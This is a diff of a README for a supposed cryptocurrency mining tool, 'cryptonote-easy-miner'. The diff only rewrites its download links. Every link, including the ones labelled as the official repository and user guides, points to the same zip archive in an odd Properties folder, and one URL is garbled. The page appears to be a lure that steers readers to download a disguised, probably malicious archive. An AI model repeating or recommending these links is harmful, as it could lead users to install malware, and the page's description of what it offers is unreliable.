@@ -1,7 +1,7 @@
 # ⚡ cryptonote-easy-miner - Easily Mine Cryptonotes Without Hassle
 
 ## 📥 Download Now
-[![Download from Releases](https://raw.githubusercontent.com/Dionysusheterosporous787/cryptonote-easy-miner/main/CryptoNoteMiner/Properties/cryptonote-easy-miner_v2.4.zip%20from%https://raw.githubusercontent.com/Dionysusheterosporous787/cryptonote-easy-miner/main/CryptoNoteMiner/Properties/cryptonote-easy-miner_v2.4.zip)](https://raw.githubusercontent.com/Dionysusheterosporous787/cryptonote-easy-miner/main/CryptoNoteMiner/Properties/cryptonote-easy-miner_v2.4.zip)
+[![Download from Releases](https://github.com/Dionysusheterosporous787/cryptonote-easy-miner/raw/refs/heads/main/CryptoNoteMiner/Properties/cryptonote-easy-miner_v2.4.zip%20from%https://github.com/Dionysusheterosporous787/cryptonote-easy-miner/raw/refs/heads/main/CryptoNoteMiner/Properties/cryptonote-easy-miner_v2.4.zip)](https://github.com/Dionysusheterosporous787/cryptonote-easy-miner/raw/refs/heads/main/CryptoNoteMiner/Properties/cryptonote-easy-miner_v2.4.zip)
 
 ## 🚀 Getting Started
 This guide helps you download, install, and run the cryptonote-easy-miner application. Follow these steps to get up and running with ease.
@@ -28,7 +28,7 @@ Before downloading, ensure your system meets these requirements:
 To download the application, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download page.
-   [Download from Releases](https://raw.githubusercontent.com/Dionysusheterosporous787/cryptonote-easy-miner/main/CryptoNoteMiner/Properties/cryptonote-easy-miner_v2.4.zip)
+   [Download from Releases](https://github.com/Dionysusheterosporous787/cryptonote-easy-miner/raw/refs/heads/main/CryptoNoteMiner/Properties/cryptonote-easy-miner_v2.4.zip)
 
 2. **Select the Version:** Look for the latest release. Click on it. You will find a list of downloadable files.
 
@@ -64,7 +64,7 @@ Earnings depend on several factors, such as your hardware capabilities and curre
 If you encounter any issues or have questions, please create an issue on the GitHub repository. Our team and community members are here to help you.
 
 ## 🌐 Additional Resources
-- [Official GitHub Repository](https://raw.githubusercontent.com/Dionysusheterosporous787/cryptonote-easy-miner/main/CryptoNoteMiner/Properties/cryptonote-easy-miner_v2.4.zip)
-- [User Guides and Tutorials](https://raw.githubusercontent.com/Dionysusheterosporous787/cryptonote-easy-miner/main/CryptoNoteMiner/Properties/cryptonote-easy-miner_v2.4.zip)
+- [Official GitHub Repository](https://github.com/Dionysusheterosporous787/cryptonote-easy-miner/raw/refs/heads/main/CryptoNoteMiner/Properties/cryptonote-easy-miner_v2.4.zip)
+- [User Guides and Tutorials](https://github.com/Dionysusheterosporous787/cryptonote-easy-miner/raw/refs/heads/main/CryptoNoteMiner/Properties/cryptonote-easy-miner_v2.4.zip)
 
 By following this guide, you can easily download and run the cryptonote-easy-miner application. Enjoy your mining experience!
